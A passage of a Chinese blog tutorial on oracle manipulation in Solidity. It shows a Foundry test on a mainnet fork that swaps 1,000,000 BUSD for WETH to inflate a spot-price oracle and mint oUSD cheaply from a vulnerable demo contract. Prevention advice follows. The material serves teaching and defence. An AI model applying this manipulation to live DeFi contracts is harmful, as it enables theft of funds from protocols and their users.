+</span></span><span class="line"><span class="cl">    <span class="n">IBUSD</span> <span class="k">private</span> <span class="n">busd</span> <span class="o">=</span> <span class="n">IBUSD</span><span class="p">(</span><span class="n">BUSD</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="n">MAINNET_RPC_URL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">oUSD</span> <span class="n">ousd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MAINNET_RPC_URL</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envString</span><span class="p">(</span><span class="s">&#34;MAINNET_RPC_URL&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// fork指定区块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="n">MAINNET_RPC_URL</span><span class="p">,</span><span class="mi">16060405</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">router</span> <span class="o">=</span> <span class="n">IUniswapV2Router</span><span class="p">(</span><span class="n">ROUTER</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ousd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">oUSD</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//forge test --match-test  testOracleAttack  -vv
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">testOracleAttack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 攻击预言机
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 0. 操纵预言机之前的价格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">priceBefore</span> <span class="o">=</span> <span class="n">ousd</span><span class="p">.</span><span class="n">getPrice</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;1. ETH Price (before attack): %s&#34;</span><span class="p">,</span> <span class="n">priceBefore</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="c1">// 给自己账户 1000000 BUSD
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint</span> <span class="n">busdAmount</span> <span class="o">=</span> <span class="mi">1</span><span class="n">_000_000</span> <span class="o">*</span> <span class="mi">10</span><span class="n">e18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="n">BUSD</span><span class="p">,</span> <span class="n">alice</span><span class="p">,</span> <span class="n">busdAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 2. 用busd买weth，推高顺时价格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">alice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">busd</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">busdAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">swapBUSDtoWETH</span><span class="p">(</span><span class="n">busdAmount</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;2. Swap 1,000,000 BUSD to WETH to manipulate the oracle&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 3. 操纵预言机之后的价格
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">priceAfter</span> <span class="o">=</span> <span class="n">ousd</span><span class="p">.</span><span class="n">getPrice</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;3. ETH price (after attack): %s&#34;</span><span class="p">,</span> <span class="n">priceAfter</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="c1">// 4. 铸造oUSD
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ousd</span><span class="p">.</span><span class="n">swap</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;4. Minted %s oUSD with 1 ETH (after attack)&#34;</span><span class="p">,</span> <span class="n">ousd</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span><span class="o">/</span><span class="mi">10</span><span class="n">e18</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Swap BUSD to WETH
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">swapBUSDtoWETH</span><span class="p">(</span><span class="kt">uint</span> <span class="n">amountIn</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amountOutMin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span>
+</span></span><span class="line"><span class="cl">        <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">amountOut</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">        <span class="n">busd</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">router</span><span class="p">),</span> <span class="n">amountIn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">BUSD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">amounts</span> <span class="o">=</span> <span class="n">router</span><span class="p">.</span><span class="n">swapExactTokensForTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">amountIn</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">amountOutMin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">alice</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// amounts[0] = BUSD amount, amounts[1] = WETH amount
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="n">amounts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="3-预防方法">3 预防方法</h2>
+<p>知名区块链安全专家 <code>samczsun</code> 在一篇<a href="https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle" target="_blank" rel="noopener noreffer ">博客</a>中总结了预言机操纵的预防方法，这里总结一下：</p>
+<ol>
+<li>不要使用流动性差的池子做价格预言机。</li>
+<li>不要使用现货/瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。</li>
+<li>使用去中心化的预言机。</li>
+<li>使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。</li>
+<li>仔细阅读第三方价格预言机的使用文档及参数设置。</li>
+</ol>
+<h2 id="4-总结">4 总结</h2>
+<p>这一讲，我们介绍了操纵预言机攻击，并攻击了一个有漏洞的合成稳定币合约，使用<code>1 ETH</code>兑换了17万亿稳定币，成为了世界首富（并没有）。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-12-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机" data-via="jollysone" data-hashtags="solidity,security,oracle"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-hashtag="solidity"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Linkedin" data-sharer="linkedin" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://blog.webhooks.top/posts/solidity-smart-contract-security-oracle-manipulation.html" data-title="合约安全：操纵预言机"><i class="fab fa-skype fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/solidity.html">solidity</a>,&nbsp;<a href="/tags/security.html">security</a>,&nbsp;<a href="/tags/oracle.html">oracle</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/blockchain-technology-interview-question-and-answer.html" class="prev" rel="prev" title="区块链技术面试题"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>区块链技术面试题</a>
+            <a href="/posts/16-safety-recommendations.html" class="next" rel="next" title="Metamask项目方给Solidity程序员的16个安全建议">Metamask项目方给Solidity程序员的16个安全建议<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">转载请注明出处</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2018 - 2023</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-CN","pageSize":10,"placeholder":"你的评论 ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"data":{"id-1":"5oneXj′s","id-2":"5oneXj′s"},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":88}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
